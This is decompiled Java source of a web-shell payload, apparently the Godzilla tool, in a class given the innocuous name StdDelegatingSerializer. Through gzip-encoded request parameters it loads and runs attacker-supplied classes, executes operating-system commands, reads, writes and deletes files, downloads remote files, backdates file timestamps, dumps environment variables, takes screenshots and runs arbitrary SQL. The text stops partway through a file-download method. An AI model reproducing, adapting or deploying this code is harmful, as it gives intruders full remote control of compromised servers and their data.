/*
 * Decompiled with CFR 0.152.
 */
package godzilla;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;

public class StdDelegatingSerializer
        extends ClassLoader {
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    HashMap parameterMap = new HashMap();
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object httpSession;
    byte[] requestData;
    ByteArrayOutputStream outputStream;
    static /* synthetic */ Class class$0;
    static /* synthetic */ Class class$1;
    static /* synthetic */ Class class$2;
    static /* synthetic */ Class class$3;
    static /* synthetic */ Class class$4;
    static /* synthetic */ Class class$5;
    static /* synthetic */ Class class$6;
    static /* synthetic */ Class class$7;
    static /* synthetic */ Class class$8;
    static /* synthetic */ Class class$9;
    static /* synthetic */ Class class$10;

    public StdDelegatingSerializer() {
    }

    public StdDelegatingSerializer(ClassLoader loader) {
        super(loader);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public byte[] run() {
        try {
            String className = this.get("evalClassName");
            String methodName = this.get("methodName");
            if (methodName != null) {
                if (className == null) {
                    Method method = this.getClass().getMethod(methodName, null);
                    Class<?> clazz = method.getReturnType();
                    Class<?> clazz2 = class$0;
                    if (clazz2 == null) {
                        try {
                            clazz2 = class$0 = Class.forName("[B");
                        }
                        catch (ClassNotFoundException classNotFoundException) {
                            throw new NoClassDefFoundError(classNotFoundException.getMessage());
                        }
                    }
                    if (clazz.isAssignableFrom(clazz2)) {
                        return (byte[])method.invoke(this, null);
                    }
                    return "this method returnType not is byte[]".getBytes();
                }
                Class evalClass = (Class)this.sessionMap.get(className);
                if (evalClass != null) {
                    Object object = evalClass.newInstance();
                    object.equals(this.parameterMap);
                    object.toString();
                    Object resultObject = this.parameterMap.get("result");
                    if (resultObject != null) {
                        Class<?> clazz = class$0;
                        if (clazz == null) {
                            try {
                                clazz = class$0 = Class.forName("[B");
                            }
                            catch (ClassNotFoundException classNotFoundException) {
                                throw new NoClassDefFoundError(classNotFoundException.getMessage());
                            }
                        }
                        if (clazz.isAssignableFrom(resultObject.getClass())) {
                            return (byte[])resultObject;
                        }
                        return "return typeErr".getBytes();
                    }
                    return new byte[0];
                }
                return "evalClass is null".getBytes();
            }
            return "method is null".getBytes();
        }
        catch (Throwable e) {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            PrintStream printStream = new PrintStream(stream);
            e.printStackTrace(printStream);
            printStream.flush();
            printStream.close();
            return stream.toByteArray();
        }
    }

    public void formatParameter() {
        this.parameterMap.clear();
        this.parameterMap.put("sessionMap", this.sessionMap);
        this.parameterMap.put("servletRequest", this.servletRequest);
        this.parameterMap.put("servletContext", this.servletContext);
        this.parameterMap.put("httpSession", this.httpSession);
        byte[] parameterByte = this.requestData;
        ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);
        ByteArrayOutputStream tp = new ByteArrayOutputStream();
        String key = null;
        byte[] lenB = new byte[4];
        byte[] data = null;
        try {
            byte t;
            GZIPInputStream inputStream = new GZIPInputStream(tStream);
            while ((t = (byte)inputStream.read()) != -1) {
                if (t == 2) {
                    key = new String(tp.toByteArray());
                    inputStream.read(lenB);
                    int len = StdDelegatingSerializer.bytesToInt(lenB);
                    data = new byte[len];
                    int readOneLen = 0;
                    while ((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                    }
                    this.parameterMap.put(key, data);
                    tp.reset();
                    continue;
                }
                tp.write(t);
            }
            tp.close();
            tStream.close();
            inputStream.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public boolean equals(Object obj) {
        if (obj != null && this.handle(obj)) {
            this.noLog(this.servletContext);
            return true;
        }
        return false;
    }

    public boolean handle(Object obj) {
        if (obj == null) {
            return false;
        }
        Class<?> clazz = class$1;
        if (clazz == null) {
            try {
                clazz = class$1 = Class.forName("java.io.ByteArrayOutputStream");
            }
            catch (ClassNotFoundException classNotFoundException) {
                throw new NoClassDefFoundError(classNotFoundException.getMessage());
            }
        }
        if (clazz.isAssignableFrom(obj.getClass())) {
            this.outputStream = (ByteArrayOutputStream)obj;
            return false;
        }
        if (this.supportClass(obj, "%s.servlet.http.HttpServletRequest")) {
            this.servletRequest = obj;
        } else if (this.supportClass(obj, "%s.servlet.ServletRequest")) {
            this.servletRequest = obj;
        } else {
            Class<?> clazz2 = class$0;
            if (clazz2 == null) {
                try {
                    clazz2 = class$0 = Class.forName("[B");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            if (clazz2.isAssignableFrom(obj.getClass())) {
                this.requestData = (byte[])obj;
            } else if (this.supportClass(obj, "%s.servlet.http.HttpSession")) {
                this.httpSession = obj;
            }
        }
        this.handlePayloadContext(obj);
        if (this.servletRequest != null && this.requestData == null) {
            Class[] classArray = new Class[1];
            Class<?> clazz3 = class$2;
            if (clazz3 == null) {
                try {
                    clazz3 = class$2 = Class.forName("java.lang.String");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[0] = clazz3;
            Object retVObject = this.getMethodAndInvoke(this.servletRequest, "getAttribute", classArray, new Object[]{"parameters"});
            if (retVObject != null) {
                Class<?> clazz4 = class$0;
                if (clazz4 == null) {
                    try {
                        clazz4 = class$0 = Class.forName("[B");
                    }
                    catch (ClassNotFoundException classNotFoundException) {
                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                    }
                }
                if (clazz4.isAssignableFrom(retVObject.getClass())) {
                    this.requestData = (byte[])retVObject;
                }
            }
        }
        return true;
    }

    private void handlePayloadContext(Object obj) {
        try {
            Method getRequestMethod = this.getMethodByClass(obj.getClass(), "getRequest", null);
            Method getServletContextMethod = this.getMethodByClass(obj.getClass(), "getServletContext", null);
            Method getSessionMethod = this.getMethodByClass(obj.getClass(), "getSession", null);
            if (getRequestMethod != null && this.servletRequest == null) {
                this.servletRequest = getRequestMethod.invoke(obj, null);
            }
            if (getServletContextMethod != null && this.servletContext == null) {
                this.servletContext = getServletContextMethod.invoke(obj, null);
            }
            if (getSessionMethod != null && this.httpSession == null) {
                this.httpSession = getSessionMethod.invoke(obj, null);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private boolean supportClass(Object obj, String classNameString) {
        if (obj == null) {
            return false;
        }
        boolean ret = false;
        Class c = null;
        try {
            c = StdDelegatingSerializer.getClass(String.format(classNameString, "javax"));
            if (c != null) {
                ret = c.isAssignableFrom(obj.getClass());
            }
            if (!ret && (c = StdDelegatingSerializer.getClass(String.format(classNameString, "jakarta"))) != null) {
                ret = c.isAssignableFrom(obj.getClass());
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return ret;
    }

    public String toString() {
        String returnString = null;
        if (this.outputStream != null) {
            try {
                this.initSessionMap();
                GZIPOutputStream gzipOutputStream = new GZIPOutputStream(this.outputStream);
                this.formatParameter();
                if (this.parameterMap.get("evalNextData") != null) {
                    this.run();
                    this.requestData = (byte[])this.parameterMap.get("evalNextData");
                    this.formatParameter();
                }
                gzipOutputStream.write(this.run());
                gzipOutputStream.close();
                this.outputStream.close();
            }
            catch (Throwable e) {
                returnString = e.getMessage();
            }
        } else {
            returnString = "outputStream is null";
        }
        this.httpSession = null;
        this.outputStream = null;
        this.parameterMap = null;
        this.requestData = null;
        this.servletContext = null;
        this.servletRequest = null;
        this.sessionMap = null;
        return returnString;
    }

    private void initSessionMap() {
        if (this.sessionMap == null) {
            if (this.getSessionAttribute("sessionMap") != null) {
                try {
                    this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");
                }
                catch (Exception exception) {}
            } else {
                this.sessionMap = new HashMap();
                try {
                    this.setSessionAttribute("sessionMap", this.sessionMap);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            if (this.sessionMap == null) {
                this.sessionMap = new HashMap();
            }
        }
    }

    public String get(String key) {
        try {
            return new String((byte[])this.parameterMap.get(key));
        }
        catch (Exception e) {
            return null;
        }
    }

    public byte[] getByteArray(String key) {
        try {
            return (byte[])this.parameterMap.get(key);
        }
        catch (Exception e) {
            return null;
        }
    }

    public byte[] test() {
        return "ok".getBytes();
    }

    public byte[] getFile() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            String buffer;
            block10: {
                dirName = dirName.trim();
                buffer = new String();
                try {
                    String currentDir = new File(dirName).getAbsoluteFile() + "/";
                    File currentDirFile = new File(currentDir);
                    if (currentDirFile.exists()) {
                        File[] files = currentDirFile.listFiles();
                        buffer = String.valueOf(buffer) + "ok";
                        buffer = String.valueOf(buffer) + "\n";
                        buffer = String.valueOf(buffer) + currentDir;
                        buffer = String.valueOf(buffer) + "\n";
                        if (files == null) break block10;
                        int i = 0;
                        while (i < files.length) {
                            File file = files[i];
                            try {
                                buffer = String.valueOf(buffer) + file.getName();
                                buffer = String.valueOf(buffer) + "\t";
                                buffer = String.valueOf(buffer) + (file.isDirectory() ? "0" : "1");
                                buffer = String.valueOf(buffer) + "\t";
                                buffer = String.valueOf(buffer) + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()));
                                buffer = String.valueOf(buffer) + "\t";
                                buffer = String.valueOf(buffer) + Integer.toString((int)file.length());
                                buffer = String.valueOf(buffer) + "\t";
                                StringBuffer stringBuffer = new StringBuffer(String.valueOf(file.canRead() ? "R" : "")).append(file.canWrite() ? "W" : "");
                                Class<?> clazz = class$3;
                                if (clazz == null) {
                                    try {
                                        clazz = Class.forName("java.io.File");
                                    }
                                    catch (ClassNotFoundException classNotFoundException) {
                                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                                    }
                                }
                                String fileState = stringBuffer.append(this.getMethodByClass(clazz, "canExecute", null) != null ? (file.canExecute() ? "X" : "") : "").toString();
                                buffer = String.valueOf(buffer) + (fileState == null || fileState.trim().length() == 0 ? "F" : fileState);
                                buffer = String.valueOf(buffer) + "\n";
                            }
                            catch (Exception e) {
                                buffer = String.valueOf(buffer) + e.getMessage();
                                buffer = String.valueOf(buffer) + "\n";
                            }
                            ++i;
                        }
                        break block10;
                    }
                    return "dir does not exist".getBytes();
                }
                catch (Exception e) {
                    return String.format("dir does not exist errMsg:%s", e.getMessage()).getBytes();
                }
            }
            return buffer.getBytes();
        }
        return "No parameter dirName".getBytes();
    }

    public String listFileRoot() {
        File[] files = File.listRoots();
        String buffer = new String();
        int i = 0;
        while (i < files.length) {
            buffer = String.valueOf(buffer) + files[i].getPath();
            buffer = String.valueOf(buffer) + ";";
            ++i;
        }
        return buffer;
    }

    public byte[] fileRemoteDown() {
        String url = this.get("url");
        String saveFile = this.get("saveFile");
        if (url != null && saveFile != null) {
            FileOutputStream outputStream = null;
            try {
                InputStream inputStream = new URL(url).openStream();
                outputStream = new FileOutputStream(saveFile);
                byte[] data = new byte[5120];
                int readNum = -1;
                while ((readNum = inputStream.read(data)) != -1) {
                    outputStream.write(data, 0, readNum);
                }
                outputStream.flush();
                outputStream.close();
                inputStream.close();
                return "ok".getBytes();
            }
            catch (Exception e) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    }
                    catch (IOException e1) {
                        return e1.getMessage().getBytes();
                    }
                }
                return String.format("%s : %s", e.getClass().getName(), e.getMessage()).getBytes();
            }
        }
        return "url or saveFile is null".getBytes();
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public byte[] setFileAttr() {
        String type = this.get("type");
        String attr = this.get("attr");
        String fileName = this.get("fileName");
        String ret = "Null";
        if (type != null && attr != null && fileName != null) {
            try {
                File file = new File(fileName);
                if ("fileBasicAttr".equals(type)) {
                    Class<?> clazz = class$3;
                    if (clazz == null) {
                        try {
                            clazz = class$3 = Class.forName("java.io.File");
                        }
                        catch (ClassNotFoundException classNotFoundException) {
                            throw new NoClassDefFoundError(classNotFoundException.getMessage());
                        }
                    }
                    if (this.getMethodByClass(clazz, "setWritable", new Class[]{Boolean.TYPE}) != null) {
                        if (attr.indexOf("R") != -1) {
                            file.setReadable(true);
                        }
                        if (attr.indexOf("W") != -1) {
                            file.setWritable(true);
                        }
                        if (attr.indexOf("X") != -1) {
                            file.setExecutable(true);
                        }
                        ret = "ok";
                        return ret.getBytes();
                    }
                    ret = "Java version is less than 1.6";
                    return ret.getBytes();
                }
                if ("fileTimeAttr".equals(type)) {
                    Class<?> clazz = class$3;
                    if (clazz == null) {
                        try {
                            clazz = class$3 = Class.forName("java.io.File");
                        }
                        catch (ClassNotFoundException classNotFoundException) {
                            throw new NoClassDefFoundError(classNotFoundException.getMessage());
                        }
                    }
                    if (this.getMethodByClass(clazz, "setLastModified", new Class[]{Long.TYPE}) != null) {
                        Date date = new Date(0L);
                        StringBuilder builder = new StringBuilder();
                        builder.append(attr);
                        char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        date = new Date(date.getTime() + Long.parseLong(builder.toString()));
                        file.setLastModified(date.getTime());
                        ret = "ok";
                        try {
                            Class<?> nioFile = Class.forName("java.nio.file.Paths");
                            Class<?> basicFileAttributeViewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                            Class<?> filesClass = Class.forName("java.nio.file.Files");
                            if (nioFile == null || basicFileAttributeViewClass == null || filesClass == null) return ret.getBytes();
                            Path path = Paths.get(fileName, new String[0]);
                            Class<?> clazz2 = class$4;
                            if (clazz2 == null) {
                                try {
                                    clazz2 = class$4 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                                }
                                catch (ClassNotFoundException classNotFoundException) {
                                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                                }
                            }
//                            BasicFileAttributeView attributeView = (BasicFileAttributeView)Files.getFileAttributeView(path, clazz2, new LinkOption[0]);
//                            attributeView.setTimes(FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()));
                            return ret.getBytes();
                        }
                        catch (Exception exception) {}
                        return ret.getBytes();
                    }
                    ret = "Java version is less than 1.2";
                    return ret.getBytes();
                }
                ret = "no ExcuteType";
                return ret.getBytes();
            }
            catch (Exception e) {
                return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
            }
        }
        ret = "type or attr or fileName is null";
        return ret.getBytes();
    }

    public byte[] readFile() {
        String fileName = this.get("fileName");
        if (fileName != null) {
            File file = new File(fileName);
            try {
                if (file.exists() && file.isFile()) {
                    byte[] data = new byte[(int)file.length()];
                    if (data.length > 0) {
                        int readOneLen = 0;
                        FileInputStream fileInputStream = new FileInputStream(file);
                        while ((readOneLen += fileInputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                        }
                        fileInputStream.close();
                    } else {
                        FileInputStream fileInputStream = new FileInputStream(file);
                        byte[] temData = new byte[0x300000];
                        int readLen = fileInputStream.read(temData);
                        if (readLen > 0) {
                            data = new byte[readLen];
                            System.arraycopy(temData, 0, data, 0, data.length);
                        }
                        fileInputStream.close();
                        temData = null;
                    }
                    return data;
                }
                return "file does not exist".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] uploadFile() {
        String fileName = this.get("fileName");
        byte[] fileValue = this.getByteArray("fileValue");
        if (fileName != null && fileValue != null) {
            try {
                File file = new File(fileName);
                file.createNewFile();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(fileValue);
                fileOutputStream.close();
                return "ok".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName and fileValue".getBytes();
    }

    public byte[] newFile() {
        String fileName = this.get("fileName");
        if (fileName != null) {
            File file = new File(fileName);
            try {
                if (file.createNewFile()) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] newDir() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            File file = new File(dirName);
            try {
                if (file.mkdirs()) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] deleteFile() {
        String dirName = this.get("fileName");
        if (dirName != null) {
            try {
                File file = new File(dirName);
                this.deleteFiles(file);
                return "ok".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] moveFile() {
        String srcFileName = this.get("srcFileName");
        String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File file = new File(srcFileName);
            try {
                if (file.exists()) {
                    if (file.renameTo(new File(destFileName))) {
                        return "ok".getBytes();
                    }
                    return "fail".getBytes();
                }
                return "The target does not exist".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter srcFileName,destFileName".getBytes();
    }

    public byte[] copyFile() {
        String srcFileName = this.get("srcFileName");
        String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File srcFile = new File(srcFileName);
            File destFile = new File(destFileName);
            try {
                if (srcFile.exists() && srcFile.isFile()) {
                    FileInputStream fileInputStream = new FileInputStream(srcFile);
                    FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                    byte[] data = new byte[5120];
                    int readNum = 0;
                    while ((readNum = fileInputStream.read(data)) > -1) {
                        fileOutputStream.write(data, 0, readNum);
                    }
                    fileInputStream.close();
                    fileOutputStream.close();
                    return "ok".getBytes();
                }
                return "The target does not exist or is not a file".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter srcFileName,destFileName".getBytes();
    }

    public byte[] include() {
        byte[] binCode = this.getByteArray("binCode");
        String className = this.get("codeName");
        if (binCode != null && className != null) {
            try {
                StdDelegatingSerializer payload = new StdDelegatingSerializer(this.getClass().getClassLoader());
                Class module = payload.g(binCode);
                this.sessionMap.put(className, module);
                return "ok".getBytes();
            }
            catch (Exception e) {
                if (this.sessionMap.get(className) != null) {
                    return "ok".getBytes();
                }
                return e.getMessage().getBytes();
            }
        }
        return "No parameter binCode,codeName".getBytes();
    }

    public Object getSessionAttribute(String keyString) {
        if (this.httpSession != null) {
            Class[] classArray = new Class[1];
            Class<?> clazz = class$2;
            if (clazz == null) {
                try {
                    clazz = class$2 = Class.forName("java.lang.String");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[0] = clazz;
            return this.getMethodAndInvoke(this.httpSession, "getAttribute", classArray, new Object[]{keyString});
        }
        return null;
    }

    public void setSessionAttribute(String keyString, Object value) {
        if (this.httpSession != null) {
            Class[] classArray = new Class[2];
            Class<?> clazz = class$2;
            if (clazz == null) {
                try {
                    clazz = class$2 = Class.forName("java.lang.String");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[0] = clazz;
            Class<?> clazz2 = class$5;
            if (clazz2 == null) {
                try {
                    clazz2 = class$5 = Class.forName("java.lang.Object");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[1] = clazz2;
            this.getMethodAndInvoke(this.httpSession, "setAttribute", classArray, new Object[]{keyString, value});
        }
    }

    public byte[] execCommand() {
        String argsCountStr = this.get("argsCount");
        if (argsCountStr != null && argsCountStr.length() > 0) {
            try {
                Process process = null;
                ArrayList<String> argsList = new ArrayList<String>();
                int argsCount = Integer.parseInt(argsCountStr);
                if (argsCount > 0) {
                    int i = 0;
                    while (i < argsCount) {
                        String val = this.get(String.format("arg-%d", new Integer(i)));
                        if (val != null) {
                            argsList.add(val);
                        }
                        ++i;
                    }
                    String[] cmdarray = new String[argsList.size()];
                    int i2 = 0;
                    while (i2 < argsList.size()) {
                        cmdarray[i2] = (String)argsList.get(i2);
                        ++i2;
                    }
                } else {
                    return "argsCount <=0".getBytes();
                }
                process = Runtime.getRuntime().exec(argsList.toArray(new String[0]));
                if (process == null) {
                    return "Unable to start process".getBytes();
                }
                InputStream inputStream = process.getInputStream();
                InputStream errorInputStream = process.getErrorStream();
                ByteArrayOutputStream memStream = new ByteArrayOutputStream(1024);
                byte[] buff = new byte[521];
                int readNum = 0;
                if (inputStream != null) {
                    while ((readNum = inputStream.read(buff)) > 0) {
                        memStream.write(buff, 0, readNum);
                    }
                }
                if (errorInputStream != null) {
                    while ((readNum = errorInputStream.read(buff)) > 0) {
                        memStream.write(buff, 0, readNum);
                    }
                }
                return memStream.toByteArray();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter argsCountStr".getBytes();
    }

    public byte[] getBasicsInfo() {
        try {
            Enumeration keys = System.getProperties().keys();
            String basicsInfo = new String();
            basicsInfo = String.valueOf(basicsInfo) + "FileRoot : " + this.listFileRoot() + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "CurrentDir : " + new File("").getAbsoluteFile() + "/" + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "CurrentUser : " + System.getProperty("user.name") + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";
            try {
                String tmpdir = System.getProperty("java.io.tmpdir");
                char lastChar = tmpdir.charAt(tmpdir.length() - 1);
                if (lastChar != '\\' && lastChar != '/') {
                    tmpdir = String.valueOf(tmpdir) + File.separator;
                }
                basicsInfo = String.valueOf(basicsInfo) + "TempDirectory : " + tmpdir + "\n";
            }
            catch (Exception tmpdir) {
                // empty catch block
            }
            basicsInfo = String.valueOf(basicsInfo) + "DocBase : " + this.getDocBase() + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "RealFile : " + this.getRealPath() + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "servletRequest : " + (this.servletRequest == null ? "null" : String.valueOf(String.valueOf(this.servletRequest.hashCode())) + "\n");
            basicsInfo = String.valueOf(basicsInfo) + "servletContext : " + (this.servletContext == null ? "null" : String.valueOf(String.valueOf(this.servletContext.hashCode())) + "\n");
            basicsInfo = String.valueOf(basicsInfo) + "httpSession : " + (this.httpSession == null ? "null" : String.valueOf(String.valueOf(this.httpSession.hashCode())) + "\n");
            try {
                basicsInfo = String.valueOf(basicsInfo) + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
            }
            catch (Exception e) {
                basicsInfo = String.valueOf(basicsInfo) + "OsInfo : " + e.getMessage() + "\n";
            }
            basicsInfo = String.valueOf(basicsInfo) + "IPList : " + StdDelegatingSerializer.getLocalIPList() + "\n";
            while (keys.hasMoreElements()) {
                Object object = keys.nextElement();
                if (!(object instanceof String)) continue;
                String key = (String)object;
                basicsInfo = String.valueOf(basicsInfo) + key + " : " + System.getProperty(key) + "\n";
            }
            Map envMap = this.getEnv();
            if (envMap != null) {
                Iterator iterator = envMap.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = (String)iterator.next();
                    basicsInfo = String.valueOf(basicsInfo) + key + " : " + envMap.get(key) + "\n";
                }
            }
            return basicsInfo.getBytes();
        }
        catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public byte[] screen() {
        try {
            Robot robot = new Robot();
            BufferedImage as = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
            ByteArrayOutputStream bs = new ByteArrayOutputStream();
            ImageIO.write((RenderedImage)as, "png", ImageIO.createImageOutputStream(bs));
            byte[] data = bs.toByteArray();
            bs.close();
            return data;
        }
        catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public byte[] execSql() throws Exception {
        String charset = this.get("dbCharset");
        String dbType = this.get("dbType");
        String dbHost = this.get("dbHost");
        String dbPort = this.get("dbPort");
        String dbUsername = this.get("dbUsername");
        String dbPassword = this.get("dbPassword");
        String execType = this.get("execType");
        String execSql = new String(this.getByteArray("execSql"), charset);
        if (dbType == null || dbHost == null || dbPort == null || dbUsername == null || dbPassword == null || execType == null || execSql == null) return "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql".getBytes();
        try {
            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            Class.forName("oracle.jdbc.driver.OracleDriver");
        }
        catch (Exception e) {
            try {
                Class.forName("oracle.jdbc.OracleDriver");
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
        }
        catch (Exception e) {
            try {
                Class.forName("com.mysql.jdbc.Driver");
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        try {
            Class.forName("org.postgresql.Driver");
        }
        catch (Exception e) {
            // empty catch block
        }
        try {
            Class.forName("org.sqlite.JDBC");
        }
        catch (Exception e) {
            // empty catch block
        }
        String connectUrl = null;
        if ("mysql".equals(dbType)) {
            connectUrl = "jdbc:mysql://" + dbHost + ":" + dbPort + "/" + "?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&noDatetimeStringSync=true&characterEncoding=utf-8";
        } else if ("oracle".equals(dbType)) {
            connectUrl = "jdbc:oracle:thin:@" + dbHost + ":" + dbPort + ":orcl";
        } else if ("sqlserver".equals(dbType)) {
            connectUrl = "jdbc:sqlserver://" + dbHost + ":" + dbPort + ";";
        } else if ("postgresql".equals(dbType)) {
            connectUrl = "jdbc:postgresql://" + dbHost + ":" + dbPort + "/";
        } else if ("sqlite".equals(dbType)) {
            connectUrl = "jdbc:sqlite:" + dbHost;
        }
        if (dbHost.indexOf("jdbc:") != -1) {
            connectUrl = dbHost;
        }
        if (connectUrl == null) return ("no " + dbType + " Dbtype").getBytes();
        try {
            Connection dbConn = null;
            try {
                dbConn = StdDelegatingSerializer.getConnection(connectUrl, dbUsername, dbPassword);
            }
            catch (Exception exception) {
                // empty catch block
            }
            if (dbConn == null) {
                dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
            }
            Statement statement = dbConn.createStatement();
            if (execType.equals("select")) {
                String data = "ok\n";
                ResultSet resultSet = statement.executeQuery(execSql);
                ResultSetMetaData metaData = resultSet.getMetaData();
                int columnNum = metaData.getColumnCount();
                int i = 0;
                while (i < columnNum) {
                    data = String.valueOf(data) + this.base64Encode(String.format("%s", metaData.getColumnName(i + 1))) + "\t";
                    ++i;
                }
                data = String.valueOf(data) + "\n";
                while (resultSet.next()) {
                    i = 0;
                    while (i < columnNum) {
                        data = String.valueOf(data) + this.base64Encode(String.format("%s", resultSet.getString(i + 1))) + "\t";
                        ++i;
                    }
                    data = String.valueOf(data) + "\n";
                }
                resultSet.close();
                statement.close();
                dbConn.close();
                return data.getBytes();
            }
            int affectedNum = statement.executeUpdate(execSql);
            statement.close();
            dbConn.close();
            return ("Query OK, " + affectedNum + " rows affected").getBytes();
        }
        catch (Exception e) {
            try {
                return e.getMessage().getBytes();
            }
            catch (Exception e2) {
                return e2.getMessage().getBytes();
            }
        }
    }

    public byte[] close() {
        try {
            if (this.httpSession != null) {
                this.getMethodAndInvoke(this.httpSession, "invalidate", null, null);
            }
            return "ok".getBytes();
        }
        catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public byte[] bigFileUpload() {
        String fileName = this.get("fileName");
        byte[] fileContents = this.getByteArray("fileContents");
        String position = this.get("position");
        try {
            if (position == null) {
                FileOutputStream fileOutputStream = new FileOutputStream(fileName, true);
                fileOutputStream.write(fileContents);
                fileOutputStream.flush();
                fileOutputStream.close();
            } else {
                RandomAccessFile fileOutputStream = new RandomAccessFile(fileName, "rw");
                fileOutputStream.seek(Integer.parseInt(position));
                fileOutputStream.write(fileContents);
                fileOutputStream.close();
            }
            return "ok".getBytes();
        }
        catch (Exception e) {
            return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
        }
    }

    public byte[] bigFileDownload() {
        String fileName = this.get("fileName");
        String mode = this.get("mode");
        String readByteNumString = this.get("readByteNum");
        String positionString = this.get("position");
        try {
            if ("fileSize".equals(mode)) {
                return String.valueOf(new File(fileName).length()).getBytes();
            }
            if ("read".equals(mode)) {
